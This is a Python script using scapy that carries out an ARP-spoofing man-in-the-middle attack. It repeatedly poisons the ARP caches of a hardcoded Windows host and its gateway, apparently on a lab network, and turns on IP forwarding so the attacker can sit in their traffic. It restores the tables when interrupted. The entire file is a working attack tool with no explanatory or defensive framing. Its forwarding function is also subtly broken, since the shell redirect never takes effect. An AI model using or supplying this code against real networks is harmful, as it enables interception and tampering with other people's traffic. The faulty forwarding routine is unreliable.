#!/usr/bin/env python3

import scapy.all as scapy
import time
import subprocess

def get_mac(ip):
    '''Scans for MAC addresses'''
    #scan network
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


def portForwarding(switch):
    '''switch on = 1; switch off = 0'''
    subprocess.call(['echo', str(switch), '>', '/proc/sys/net/ipv4/ip_forward'], shell=True)
    if switch == 0:
        print('[+] Port Forwarding Off..')
    elif switch == 1:
        print('[+] Port Forwarding On..\n')


sent_packets_count = 0
windows_ip = '10.0.2.31'
gateway_ip = '10.0.2.1'

try:
    portForwarding(1)
    while True:
        spoof(windows_ip, gateway_ip)
        spoof(gateway_ip, windows_ip)
        sent_packets_count += 2
        print(f'\r[+] Packets Sent: {sent_packets_count}', end='') #dynamic printing
        time.sleep(2)
except KeyboardInterrupt:
    print('\n\n[+] ARP Spoof Complete..')
    restore(windows_ip, gateway_ip)
    restore(gateway_ip, windows_ip)
    portForwarding(0)
    print('\n[+] ARP Tables Reset...\n')
